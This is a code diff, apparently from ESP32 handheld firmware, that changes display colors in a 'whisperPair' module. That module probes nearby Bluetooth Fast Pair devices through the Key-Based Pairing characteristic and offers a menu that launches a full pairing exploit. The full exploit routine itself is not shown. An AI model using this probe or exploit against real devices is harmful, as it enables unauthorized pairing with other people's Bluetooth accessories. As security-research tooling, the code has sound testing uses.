@@ -19,7 +19,7 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
 
     while(millis() - startTime < ms) {
         if(check(EscPress)) {
-            displayMessage("Cancelled", "", "", "", 0);
+            displayMessage("Cancelled", "", "", "", TFT_WHITE);
             delay(1000);
             return false;
         }
@@ -31,7 +31,7 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
             tft.fillRect(20, 120, ((tftWidth-40) * progress) / 100, 10, TFT_GREEN);
         } else {
             if(holding) {
-                displayMessage("Released too soon", "", "", "", 0);
+                displayMessage("Released too soon", "", "", "", TFT_WHITE);
                 delay(1000);
                 return false;
             }
@@ -41,7 +41,7 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
     }
 
     if(holding) {
-        displayMessage("Confirmed!", "", "", "", 0);
+        displayMessage("Confirmed!", "", "", "", TFT_WHITE);
         delay(500);
         return true;
     }
@@ -50,21 +50,21 @@ bool requireButtonHoldConfirmation(const char* message, uint32_t ms) {
 }
 
 bool attemptKeyBasedPairing(NimBLEAddress target) {
-    displayMessage("Connecting to target...", "", "", "", 0);
+    displayMessage("Connecting to target...", "", "", "", TFT_WHITE);
 
     NimBLEClient* pClient = NimBLEDevice::createClient();
 
     if(!pClient->connect(target)) {
-        displayMessage("Connection failed", "", "", "", 0);
+        displayMessage("Connection failed", "", "", "", TFT_WHITE);
         NimBLEDevice::deleteClient(pClient);
         return false;
     }
 
-    displayMessage("Connected, discovering...", "", "", "", 0);
+    displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);
 
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService == nullptr) {
-        displayMessage("Fast Pair service not found", "", "", "", 0);
+        displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
@@ -72,7 +72,7 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
 
     NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
     if(pChar == nullptr) {
-        displayMessage("KBP char not found", "", "", "", 0);
+        displayMessage("KBP char not found", "", "", "", TFT_WHITE);
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
@@ -92,10 +92,10 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
 
     esp_fill_random(&packet[8], 8);
 
-    displayMessage("Sending test packet...", "", "", "", 0);
+    displayMessage("Sending test packet...", "", "", "", TFT_WHITE);
 
     if(pChar->writeValue(packet, 16, false)) {
-        displayMessage("Packet sent, checking...", "", "", "", 0);
+        displayMessage("Packet sent, checking...", "", "", "", TFT_WHITE);
         delay(100);
 
         bool vulnerable = pChar->canRead() || pChar->canNotify();
@@ -104,10 +104,10 @@ bool attemptKeyBasedPairing(NimBLEAddress target) {
         NimBLEDevice::deleteClient(pClient);
 
         if(vulnerable) {
-            displayMessage("DEVICE VULNERABLE!", "", "", "", 0);
+            displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
             return true;
         } else {
-            displayMessage("No response - may be patched", "", "", "", 0);
+            displayMessage("No response - may be patched", "", "", "", TFT_WHITE);
             return false;
         }
     }
@@ -164,7 +164,7 @@ void whisperPairMenu() {
 
         NimBLEAddress target(input.c_str(), BLE_ADDR_RANDOM);
 
-        displayMessage("Starting full exploit...", "", "", "", 0);
+        displayMessage("Starting full exploit...", "", "", "", TFT_WHITE);
         padprintln("1. Connect to device");
         padprintln("2. ECDH key exchange");
         padprintln("3. Complete pairing");
@@ -176,11 +176,11 @@ void whisperPairMenu() {
         bool success = whisperPairFullExploit(target);
 
         if(success) {
-            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", 0);
-            displayMessage("Device paired", "", "", "", 0);
+            displayMessage("EXPLOIT SUCCESSFUL!", "", "", "", TFT_WHITE);
+            displayMessage("Device paired", "", "", "", TFT_WHITE);
         } else {
-            displayMessage("Exploit failed", "", "", "", 0);
-            displayMessage("May be patched", "", "", "", 0);
+            displayMessage("Exploit failed", "", "", "", TFT_WHITE);
+            displayMessage("May be patched", "", "", "", TFT_WHITE);
         }
         delay(3000);
     }});
@@ -191,5 +191,5 @@ void whisperPairMenu() {
 
     options.push_back({"Back", []() { returnToMenu = true; }});
 
-    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair");
+    loopOptions(options, MENU_TYPE_SUBMENU, "whisperPair", 0, false);
 }
